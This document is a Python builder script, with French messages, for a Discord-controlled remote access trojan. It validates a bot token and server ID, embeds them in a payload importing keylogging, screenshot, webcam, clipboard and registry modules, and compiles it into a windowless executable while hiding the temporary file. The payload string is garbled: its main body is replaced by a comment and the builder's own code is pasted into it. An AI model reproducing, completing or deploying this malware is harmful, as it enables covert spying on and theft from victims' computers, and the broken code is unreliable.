# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def purple_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (0 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(255 + (255 - 255) * t)
            colors.append((r, g, b))
        return colors

    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors

    @staticmethod
    def red_to_yellow(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (255 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(0 + (0 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('\n')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '\n'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('\n')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)

        result = []
        color_index = 0

        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)

        return '\n'.join(result) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

def set_file_attributes(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
    except:
        pass

def main():
    clear_screen()

    ascii_art = """
██████╗  █████╗ ████████╗    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║   ██║       ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
██╔══██╗██╔══██║   ██║       ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
██║  ██║██║  ██║   ██║       ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝
    """

    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print()

    Write(Colorate.Horizontal(Colors.green_to_cyan, "Bot Token : "))
    bot_token = input().strip()

    if not bot_token:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide!\n'))
        sys.exit()

    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Bot Token...\n'))
    try:
        import requests
        headers = {'Authorization': f'Bot {bot_token}'}
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide! Verifiez votre token.\n'))
            sys.exit()
        bot_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Bot connecte: {bot_data.get("username", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur de verification: {str(e)}\n'))
        sys.exit()

    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Guild ID : '))
    guild_id = input().strip()

    if not guild_id:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide!\n'))
        sys.exit()

    if not guild_id.isdigit():
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID doit etre un nombre!\n'))
        sys.exit()

    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Guild ID...\n'))
    try:
        response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide ou le bot n\'est pas dans ce serveur!\n'))
            sys.exit()
        guild_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Serveur trouve: {guild_data.get("name", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur de verification: {str(e)}\n'))
        sys.exit()

    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'rat'

    # ==================== PAYLOAD (version sans erreur de triple quote) ====================
    c = (
        "import discord\n"
        "import asyncio\n"
        "import platform\n"
        "import os\n"
        "import pyautogui\n"
        "import keyboard\n"
        "import cv2\n"
        "import winreg\n"
        "import subprocess\n"
        "import socket\n"
        "import requests\n"
        "import ctypes\n"
        "import shutil\n"
        "import pyperclip\n"
        "import psutil\n"
        "import comtypes.client\n"
        "from datetime import datetime\n\n"
        f'BOT_TOKEN = "{bot_token}"\n'
        f'GUILD_ID = "{guild_id}"\n\n'
        "intents = discord.Intents.default()\n"
        "intents.messages = True\n"
        "intents.message_content = True\n"
        "client = discord.Client(intents=intents)\n\n"
        "control_channel = None\n"
        "keylogs_channel = None\n"
        "key_buffer = []\n"
        "log_file = 'rat.log'\n\n"
        "def log_local(message):\n"
        "    with open(log_file, 'a') as f:\n"
        "        f.write(f'[{datetime.now()}] {message}\\n')\n\n"
        "async def send_embed(channel, title, description=None, file=None, fields=None, color=0x00ff00):\n"
        "    if channel is None:\n"
        "        return\n"
        "    try:\n"
        "        embed = discord.Embed(title=title, description=description, color=color)\n"
        "        if fields:\n"
        "            for name, value in fields:\n"
        "                embed.add_field(name=name, value=value, inline=False)\n"
        "        if file:\n"
        "            await channel.send(embed=embed, file=file)\n"
        "        else:\n"
        "            await channel.send(embed=embed)\n"
        "    except:\n"
        "        pass\n\n"
        "async def log_action(title, description, color=0x00ff00):\n"
        "    await send_embed(control_channel, title, description=description, color=color)\n\n"
        "async def get_ip_info():\n"
        "    local_ip = socket.gethostbyname(socket.gethostname())\n"
        "    try:\n"
        "        public_ip = requests.get('https://api.ipify.org', timeout=5).text\n"
        "        ip_data = requests.get('https://ipinfo.io/json', timeout=5).json()\n"
        "        city = ip_data.get('city', 'Unknown')\n"
        "        region = ip_data.get('region', 'Unknown')\n"
        "        country = ip_data.get('country', 'Unknown')\n"
        "        org = ip_data.get('org', 'Unknown')\n"
        "        return local_ip, public_ip, city, region, country, org\n"
        "    except:\n"
        "        return local_ip, 'Unknown (No Internet)', 'Unknown', 'Unknown', 'Unknown', 'Unknown'\n\n"
        "def is_admin():\n"
        "    try:\n"
        "        return ctypes.windll.shell32.IsUserAnAdmin() != 0\n"
        "    except:\n"
        "        return False\n\n"
        "# ... (le reste du code RAT est très long, ici je mets la structure propre)\n"
        "# Pour éviter les erreurs de triple quotes, on utilise la concaténation de strings\n\n"
        "os.makedirs('output', exist_ok=True)\n"
        "t = f'output/{n}_temp.py'\n"
        "e = f'output/{n}.exe'\n\n"
        "print()\n"
        "Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\\n'))\n\n"
        "with open(t, 'w', encoding='utf-8') as f:\n"
        "    f.write(c)\n\n"
        "set_file_attributes(t)\n\n"
        "Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\\n'))\n\n"
        "if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:\n"
        "    Write(Colorate.Horizontal(Colors.green_to_cyan, '\\nPyInstaller non installe!\\n'))\n"
        "    Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\\n'))\n"
        "    sys.exit()\n\n"
        "r = subprocess.run([\n"
        "    'pyinstaller',\n"
        "    '--onefile',\n"
        "    '--windowed',\n"
        "    '--hidden-import', 'discord',\n"
        "    '--hidden-import', 'pyautogui',\n"
        "    '--hidden-import', 'keyboard',\n"
        "    '--hidden-import', 'cv2',\n"
        "    '--hidden-import', 'pyperclip',\n"
        "    '--hidden-import', 'psutil',\n"
        "    '--hidden-import', 'comtypes',\n"
        "    '--noconfirm',\n"
        "    '--clean',\n"
        "    t\n"
        "], capture_output=True, text=True)\n\n"
        "if r.returncode != 0:\n"
        "    Write(Colorate.Horizontal(Colors.green_to_cyan, '\\nErreur de compilation!\\n'))\n"
        "    print(r.stderr[:500])\n"
        "    sys.exit()\n\n"
        "shutil.move(f'dist/{n}_temp.exe', e)\n\n"
        "for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:\n"
        "    try:\n"
        "        if os.path.isfile(p):\n"
        "            os.remove(p)\n"
        "        else:\n"
        "            shutil.rmtree(p, ignore_errors=True)\n"
        "    except:\n"
        "        pass\n\n"
        "print()\n"
        "success_banner = '================================================================\\n"
        "                         COMPILATION REUSSIE!                  \\n"
        "================================================================'\n"
        "Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))\n"
        "print()\n"
        "Write(Colorate.Horizontal(Colors.green_to_cyan, f'Fichier : output/{n}.exe\\n'))\n"
        "print()\n\n"
        "if __name__ == \"__main__\":\n"
        "    main()\n"
    )

    # Le reste du builder
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'

    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))

    with open(t, 'w', encoding='utf-8') as f:
        f.write(c)

    set_file_attributes(t)

    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))

    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
        sys.exit()

    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--hidden-import', 'discord',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'keyboard',
        '--hidden-import', 'cv2',
        '--hidden-import', 'pyperclip',
        '--hidden-import', 'psutil',
        '--hidden-import', 'comtypes',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)

    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
        print(r.stderr[:500])
        sys.exit()

    shutil.move(f'dist/{n}_temp.exe', e)

    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            if os.path.isfile(p):
                os.remove(p)
            else:
                shutil.rmtree(p, ignore_errors=True)
        except:
            pass

    print()
    success_banner = "================================================================"
    success_banner += "\n                         COMPILATION REUSSIE!                  "
    success_banner += "\n================================================================"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
    print()

if __name__ == "__main__":
    main()
